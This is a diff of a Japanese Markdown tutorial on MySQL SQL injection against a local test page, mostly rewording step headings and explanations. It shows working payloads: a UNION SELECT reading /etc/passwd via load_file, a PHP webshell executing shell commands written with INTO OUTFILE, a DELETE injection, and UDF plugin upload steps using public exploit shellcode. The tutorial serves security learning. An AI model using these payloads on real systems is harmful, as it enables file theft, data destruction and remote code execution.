@@ -10,12 +10,12 @@
 - [LOAD_FILE - Read file](#load_file-read-file)
   - [前提条件](#前提条件)
   - [手順](#手順)
-    - [Step 1: LOAD_FILEで読みだした内容をSELECT文で出力する](#step-1-load_fileで読みだした内容をselect文で出力する)
+    - [Step 1: LOAD_FILEでファイルを読み出す](#step-1-LOAD_FILEでファイルを読み出す)
   - [対策](#対策)
 - [INTO OUTFILE - Write a PHP file to RCE](#into-outfile-write-a-php-file-to-rce)
   - [前提条件](#前提条件-1)
   - [手順](#手順-1)
-    - [Step 1: WebShell入りのPHPファイルを `INTO OUTFILE` で書き込む](#step-1-webshell入りのphpファイルを-into-outfile-で書き込む)
+    - [PHPファイルを `INTO OUTFILE` で書き込む](#step-1-phpファイルを-into-outfile-で書き込む)
     - [Step 2: PHP経由でOSコマンドを実行する](#step-2-php経由でosコマンドを実行する)
   - [対策](#対策-1)
 - [UDF - Write a plugin file to RCE](#udf-write-a-plugin-file-to-rce)
@@ -78,9 +78,11 @@ http://localhost:8888/mysql.php?user=&pass='; DELETE FROM users WHERE username='
 
 ### 手順
 
-#### Step 1: LOAD_FILEで読みだした内容をSELECT文で出力する
+#### Step 1: LOAD_FILEでファイルを読み出す
 
-`load_file`関数を用いてファイルの内容を読み出す。UNION SELECTで内容を出力させることができる
+`load_file`関数を用いることでファイルの内容を読み出すことができる。
+
+読みだした内容は、UNION SELECT文を使えばクエリの結果として出力させることができる。
 
 ```
 http://localhost:8888/mysql.php?user=&pass=' UNION SELECT NULL,NULL,load_file('/etc/passwd');--+
@@ -106,9 +108,9 @@ http://localhost:8888/mysql.php?user=&pass=' UNION SELECT NULL,NULL,load_file('/
 
 ### 手順
 
-#### Step 1: WebShell入りのPHPファイルを `INTO OUTFILE` で書き込む
+#### Step 1: PHPファイルを `INTO OUTFILE` で書き込む
 
-以下のデータをPHPファイルとして書き込む。
+`INTO OUTFILE`を使用して、WebShellとして動作するPHPコードをPHPファイルとして書き込む。
 
 ```php
 <?php $param=$_GET["cmd"]; echo shell_exec($param);
@@ -151,6 +153,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 - MySQLがプラグインディレクトリに書き込む権限を持っている場合、UDFを含むバイナリを書き込み、プラグインとしてロードさせることで任意コード実行ができる
 - コンパイル済みのOSコマンド実行UDFも世の中に転がっている
   - 例. https://www.exploit-db.com/exploits/46249
+- MySQLの場合、バイナリファイルはプラグイン用のディレクトリに配置される必要がある
 
 
 ### 手順
@@ -172,9 +175,9 @@ http://localhost:8888/mysql.php?user=&pass=' UNION SELECT @@plugin_dir,'','';--+
 
 [既存のExploitコード](https://www.exploit-db.com/exploits/46249)中に含まれる `shellcode_x64` の値がコンパイル済みのバイナリデータになっている。以下の手順ではこちらの値を流用する。
 
-GETリクエストだとURI長の制限に引っかかるため、POSTリクエストで投げる。
+下記のコマンド内のコメント部分をバイナリデータに置き換える。
 
-もし、GETリクエストしか使えない場合は、バイナリファイルを分割してDB内に格納し、後から連結することで制限を回避できる。
+GETリクエストだとURI長の制限に引っかかるため、POSTリクエストで投げる。もし、GETリクエストしか使えない場合は、バイナリファイルを分割してDB内に格納し、後から連結することで制限を回避できる。
 
 ```
 curl http://localhost:8888/mysql.php \
